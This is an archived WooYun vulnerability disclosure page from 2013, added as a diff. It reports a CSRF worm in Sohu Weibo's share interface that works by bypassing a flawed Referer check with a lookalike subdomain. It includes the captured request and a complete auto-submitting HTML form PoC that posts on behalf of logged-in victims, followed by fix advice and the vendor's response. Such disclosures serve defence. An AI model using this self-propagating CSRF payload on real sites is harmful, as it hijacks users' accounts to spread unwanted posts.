@@ -1,0 +1,239 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐微博防御体系存在缺陷导致蠕虫爆发  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐微博防御体系存在缺陷导致蠕虫爆发  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风萧萧">风萧萧</a> 
+</li><li>提交时间：		2013-01-18 10:38</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-07：	细节向普通白帽子公开<br/>
+									2013-02-17：	细节向实习白帽子公开<br/>
+									2013-03-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">国家终于有任务交给你了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.存在蠕虫肯定是发布微博的地方出了问题，看这个分享到搜狐微博的接口：</p><p class="detail"><a href="../images/18003716b03c5474b812f925b27ca5b1c4fb05ed.jpg" target="_blank"><img src="../images/18003716b03c5474b812f925b27ca5b1c4fb05ed.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.点击【分享】，抓包看请求：</p><pre><code>POST http://t.sohu.com/third/insertTwitter HTTP/1.1<br />
+Host: t.sohu.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 360<br />
+Origin: http://t.sohu.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.2 Safari/537.13<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Referer: http://t.sohu.com/third/post.jsp?link=http%3A%2F%2Fyule.sohu.com%2F20130117%2Fn363726424.shtml&amp;title=%E4%B8%93%E8%AE%BF%E5%91%A8%E6%98%9F%E9%A9%B0%EF%BC%9A%E5%A6%82%E6%9E%9C%E8%A7%82%E4%BC%97%E6%8E%A5%E5%8F%97%20%E6%88%91%E5%B0%B1%E7%BB%A7%E7%BB%AD%E5%90%83%E8%80%81%E6%9C%AC-%E6%90%9C%E7%8B%90%E5%A8%B1%E4%B9%90<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: 略<br />
+<br />
+act=insertOrigin&amp;msg=%u56FD%u5BB6%u6709%u4EFB%u52A1%u7ED9%u4F60%u4E86%uFF01&amp;type=2115&amp;url=http%3A%2F%2Ft.itc.cn%2FnWfah&amp;app_key=cmsnew&amp;title=%D7%A8%B7%C3%D6%DC%D0%C7%B3%DB%A3%BA%C8%E7%B9%FB%B9%DB%D6%DA%BD%D3%CA%DC+%CE%D2%BE%CD%BC%CC%D0%F8%B3%D4%C0%CF%B1%BE-%CB%D1%BA%FC%D3%E9%C0%D6&amp;media=%CB%D1%BA%FC%D3%E9%C0%D6&amp;mediaurl=http%3A%2F%2Fyule.sohu.com%2F&amp;summary=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3.上述请求POST参数的具体含义看参数名就知道了，这里简单说下msg参数是转发微博时自己留言的内容，url参数是指转发的微博来自的具体链接，titile参数是转发来的微博的标题，media参数是指微博来自什么媒体，mediaurl当然指的是媒体的链接咯！<br />
+<br />
+<br />
+<br />
+4.这里实际上是做referer判断的，即referer必须为sohu.com或者空，其他域不行。这意味着我是不是只能本地单机玩了啊！哈哈，经过简单的测试，发现验证referer的正则表达式写的有问题！只是判断了域名是否包含有sohu.com，而不是验证根域名为sohu.com。那么我这里可以构造子域名t.sohu.com.test.av作为蠕虫传播的载体服务器，即可绕过。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">5.于是乎，我构造了下面这个POC链接：</p><pre><code>http://t.sohu.com.xssed.me/csrf/sohu.html</code></pre><p class='detail'><br />
+<br />
+将POC代码一并贴在这里：</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;fxx&quot; name=&quot;fxx&quot; action=&quot;http://t.sohu.com/third/insertTwitter&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;act&quot; value=&quot;insertOrigin&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;msg&quot; id=&quot;msg&quot; value=&quot;follow me&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;type&quot; value=&quot;2115&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;url&quot; value=&quot;http://t.sohu.com.xssed.me/csrf/sohu.html&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;app_key&quot; value=&quot;cmsnew&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;专访周星驰：如果观众接受 我就继续吃老本-搜狐娱乐&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;media&quot; value=&quot;xssed.me&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;mediaurl&quot; value=&quot;http://t.sohu.com.xssed.me/csrf/sohu.html&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;summary&quot; value=&quot;&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.fxx.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6.Chrome登录风萧萧吸的微博账号发布微博如下：</p><p class="detail"><a href="../images/18004348c27e1e622aa8f4f061fbd8fa91f8edad.jpg" target="_blank"><img src="../images/18004348c27e1e622aa8f4f061fbd8fa91f8edad.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7.Firefox登录另一个网易微博账号，找到风萧萧吸：</p><p class="detail"><a href="../images/180044193b7f8c45e2d685e9987987cf96125605.jpg" target="_blank"><img src="../images/180044193b7f8c45e2d685e9987987cf96125605.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8.点击【专访周星驰】处，返回如下：</p><p class="detail"><a href="../images/180046305d95b0f6012a4230f48fdfeb1cf57cf1.jpg" target="_blank"><img src="../images/180046305d95b0f6012a4230f48fdfeb1cf57cf1.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9.同时，自己也转发了相关蠕虫微博：</p><p class="detail"><a href="../images/18004657d12fee6e238020c78a7346ab37cae478.jpg" target="_blank"><img src="../images/18004657d12fee6e238020c78a7346ab37cae478.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.既然referer域名可以改成t.163.com.test.av是可以的，那么改成test.av/csrf.php?163.com呢，是不是可以呢？这个以后大家当做小的细节来考虑吧！<br />
+<br />
+<br />
+<br />
+2.在防御方面，强烈建议：<br />
+<br />
+关键请求还是改成post比较好！<br />
+<br />
+关键请求还是加token比较好！<br />
+<br />
+<br />
+<br />
+3.另外，不管怎样我还是来求个礼物吧！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风萧萧" title="风萧萧">风萧萧</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017468" title="搜狐微博防御体系存在缺陷导致蠕虫爆发">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-01-18 14:23</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对搜狐安全的关注</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17468";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
